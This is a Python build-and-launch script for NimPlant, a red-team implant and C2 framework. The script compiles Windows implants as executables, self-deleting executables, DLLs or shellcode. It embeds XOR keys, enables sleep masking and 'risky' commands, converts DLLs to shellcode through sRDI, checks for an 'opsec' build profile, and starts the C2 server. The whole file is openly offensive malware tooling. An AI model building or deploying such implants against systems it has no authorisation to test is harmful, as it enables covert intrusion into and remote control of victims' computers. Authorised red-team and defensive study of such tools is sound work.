#!/usr/bin/python3
# pylint: disable=import-outside-toplevel

# -----
#
#   NimPlant - A light-weight stage 1 implant and C2 written in Nim|Rust and Python
#   By Cas van Cooten (@chvancooten)
#
#   This is a wrapper script to configure and generate NimPlant and its C2 server
#
# -----

import os
import random
import sys
import time
import toml
from client.dist.srdi.ShellcodeRDI import ConvertToShellcode, HashFunctionName


def print_banner():
    print(
        r"""
                  *    *(#    #             
                  **  **(##  ##             
         ########       (       ********    
        ####(###########************,****   
           # ########       ******** *      
           .###                   ***       
           .########         ********       
           ####    ###     ***    ****      
         ######### ###     *** *********    
       #######  ####  ## **  ****  *******  
       #####    ##      *      **    *****  
       ######  ####   ##***   **** .******  
       ###############     ***************  
            ##########     **********       
               #########**********          
                 #######********           
     _   _ _           ____  _             _   
    | \ | (_)_ __ ___ |  _ \| | __ _ _ __ | |_ 
    |  \| | | '_ ` _ \| |_) | |/ _` | '_ \| __|
    | |\  | | | | | | |  __/| | (_| | | | | |_ 
    |_| \_|_|_| |_| |_|_|   |_|\__,_|_| |_|\__|                                  
                                                                                                  
        A light-weight stage 1 implant and C2 written in Nim|Rust and Python
        By Cas van Cooten (@chvancooten)
    """
    )


def print_usage():
    print(
        """
    Usage:
        python3 NimPlant.py command [required args] <optional args>

    Acceptable commands:
        compile [exe / exe-selfdelete / dll / raw / all] <nim / rust / nim-debug / rust-debug> <rotatekey>
        server <server name>
        cleanup
    """
    )


def get_xor_key(force_new=False):
    if os.path.isfile(".xorkey") and not force_new:
        file = open(".xorkey", "r", encoding="utf-8")
        xor_key = int(file.read())
    else:
        print("Generating unique XOR key for pre-crypto operations...")
        print(
            "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
        )
        xor_key = random.randint(0, 2147483647)
        with open(".xorkey", "w", encoding="utf-8") as file:
            file.write(str(xor_key))

    return xor_key


def compile_implant(implant_type, binary_type, xor_key):
    # Parse config for certain compile-time tasks
    config_path = os.path.abspath(
        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
    )
    config = toml.load(config_path)

    match implant_type:
        case "nim":
            message = "NimPlant"
            compile_function = compile_nim
        case "nim-debug":
            message = "NimPlant with debugging enabled"
            compile_function = compile_nim_debug
        case "rust":
            message = "Rusty NimPlant"
            compile_function = compile_rust
        case "rust-debug":
            message = "Rusty NimPlant with debugging enabled"
            compile_function = compile_rust_debug

    if binary_type == "exe":
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config)
    elif binary_type == "exe-selfdelete":
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config)
    elif binary_type == "dll":
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config)
    elif binary_type == "raw" or binary_type == "bin":
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config)
    else:
        # Compile all
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config)
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config)
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config)
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config)


def compile_nim_debug(binary_type, xor_key, config):
    if binary_type == "exe-selfdelete":
        print("ERROR: Cannot compile self-deleting NimPlant with debugging enabled!")
        print(
            "       Please test with the regular executable first, then compile the self-deleting version."
        )
        print("       Skipping this build...")
        return

    compile_nim(binary_type, xor_key, config, debug=True)


def compile_nim(binary_type, xor_key, config, debug=False):
    # Construct compilation command
    if binary_type == "exe" or binary_type == "exe-selfdelete" or binary_type == "dll":
        compile_command = f"nim c --hints:off --warnings:off -d:xor_key={xor_key} -d:release -d:strip -d:noRes"

        if debug:
            compile_command = compile_command + " -d:verbose"
        else:
            compile_command = compile_command + " --app:gui"

        if os.name != "nt":
            compile_command = compile_command + " -d=mingw"

        if binary_type == "exe":
            compile_command = compile_command + " -o:client/bin/NimPlant.exe"

        if binary_type == "exe-selfdelete":
            compile_command = (
                compile_command + " -o:client/bin/NimPlant-selfdelete.exe -d:selfdelete"
            )

        if binary_type == "dll":
            compile_command = (
                compile_command
                + " -o:client/bin/NimPlant.dll --app=lib --nomain -d:exportDll --passL:-Wl,--dynamicbase --gc:orc"
            )

        # Sleep mask enabled only if defined in config.toml
        sleep_mask_enabled = config["nimplant"]["sleepMask"]
        if sleep_mask_enabled:
            compile_command = compile_command + " -d:sleepmask"

        # Allow risky commands only if defined in config.toml
        risky_mode = config["nimplant"]["riskyMode"]
        if risky_mode:
            compile_command = compile_command + " -d:risky"

        compile_command = compile_command + " client/NimPlant.nim"
        os.system(compile_command)

    elif binary_type == "raw":
        if not os.path.isfile("client/bin/NimPlant.dll"):
            compile_nim("dll", xor_key, config)
        else:
            # Compile a new DLL NimPlant if no recent version exists
            file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
            last_time = (time.time() - file_mod_time) / 60

            if not last_time < 5:
                compile_nim("dll", xor_key, config)

        # Convert DLL to PIC using sRDI
        dll = open("client/bin/NimPlant.dll", "rb").read()
        shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x4)
        with open("client/bin/NimPlant.bin", "wb") as f:
            f.write(shellcode)


def compile_rust_debug(binary_type, xor_key, config):
    compile_rust(binary_type, xor_key, config, debug=True)


def compile_rust(binary_type, _xor_key, config, debug=False):
    # TODO: Argparse
    # TODO: Update CI/CD (+yara?)

    # Check if opsec profile has been applied
    try:
        with open(
            os.path.expanduser("~/.cargo/config.toml"), "r", encoding="utf-8"
        ) as f:
            opsec_enabled = "-Zlocation-detail=none" in f.read()
    except FileNotFoundError:
        opsec_enabled = False

    if not opsec_enabled:
        print("NOTE: Follow the tips in 'client-rs/Cargo.toml' for increased opsec.")

    # Construct compilation command
    compile_command = (
        "cargo build --manifest-path=client-rs/Cargo.toml --target-dir=client-rs/bin -q"
    )

    match binary_type:
        case "exe":
            pass  # No additional flags needed
        case "exe-selfdelete":
            # TODO: Exe-Selfdelete
            print("RUST EXE-SELFDELETE NOT YET IMPLEMENTED.")
            exit(1)
        case "dll":
            # TODO: Dll
            print("RUST DLL NOT YET IMPLEMENTED.")
            exit(1)
        case "raw":
            # TODO: Shellcode
            print("RUST SHELLCODE NOT YET IMPLEMENTED.")
            exit(1)

    if not debug:
        compile_command = compile_command + " --release"

    if os.name != "nt":
        compile_command = compile_command + " --target x86_64-pc-windows-gnu"

        # When cross-compiling, we need to tell sodiumoxide to use
        # a pre-compiled version libsodium (which is packaged)
        os.environ["SODIUM_SHARED"] = "1"
        os.environ["SODIUM_LIB_DIR"] = os.path.abspath(
            os.path.join(os.path.dirname(sys.argv[0]), "client-rs/dist/")
        )

    # Sleep mask enabled only if defined in config.toml
    sleep_mask_enabled = config["nimplant"]["sleepMask"]
    if sleep_mask_enabled:
        # TODO: Sleep mask
        print("RUST SLEEP MASK NOT YET IMPLEMENTED.")
        exit(1)

    # Allow risky commands only if defined in config.toml
    risky_mode = config["nimplant"]["riskyMode"]
    if risky_mode:
        compile_command = compile_command + " --features=risky"

    os.system(compile_command)


def main():
    print_banner()

    if not os.path.isfile("config.toml"):
        print(
            "ERROR: No configuration file found. Please create 'config.toml' based on the example configuration before use."
        )
        exit(1)

    if len(sys.argv) > 1:
        if sys.argv[1] == "compile":
            if len(sys.argv) > 3 and sys.argv[3].lower() in [
                "nim",
                "nim-debug",
                "rust",
                "rust-debug",
            ]:
                implant = sys.argv[3].lower()
            else:
                implant = "nim"

            if len(sys.argv) > 2 and sys.argv[2].lower() in [
                "exe",
                "exe-selfdelete",
                "dll",
                "raw",
                "bin",
                "all",
            ]:
                binary = sys.argv[2].lower()
            else:
                binary = "all"

            if "rotatekey" in sys.argv:
                xor_key = get_xor_key(True)
            else:
                xor_key = get_xor_key()

            compile_implant(implant, binary, xor_key)

            out_path = "client-rs/bin" if implant.startswith("rust") else "client/bin"
            print(f"Done compiling! You can find compiled binaries in '{out_path}'.")

        elif sys.argv[1] == "server":
            xor_key = get_xor_key()
            from server.server import main as server_main

            try:
                name = sys.argv[2]
                server_main(xor_key, name)
            except IndexError:
                server_main(xor_key, "")

        elif sys.argv[1] == "cleanup":
            from shutil import rmtree

            # Confirm if the user is sure they want to delete all files
            print("WARNING: This will delete ALL NimPlant server data:")
            print("         uploads/downloads, logs, and the database!")
            print("         Are you sure you want to continue? (y/n):", end=" ")

            if input().lower() == "y":
                print("Cleaning up...")

                try:
                    # Clean up files
                    for filepath in ["server/nimplant.db"]:
                        if os.path.exists(filepath) and os.path.isfile(filepath):
                            os.remove(filepath)

                    # Clean up directories
                    for dirpath in [
                        "server/downloads",
                        "server/logs",
                        "server/uploads",
                    ]:
                        if os.path.exists(dirpath) and os.path.isdir(dirpath):
                            rmtree(dirpath)

                    print("Cleaned up NimPlant server files!")
                except OSError:
                    print(
                        "ERROR: Could not clean up all NimPlant server files. Do you have the right privileges?"
                    )

            else:
                print("Aborting...")

        else:
            print_usage()
            print("ERROR: Unrecognized command.")
            exit(1)
    else:
        print_usage()
        exit(1)


if __name__ == "__main__":
    main()
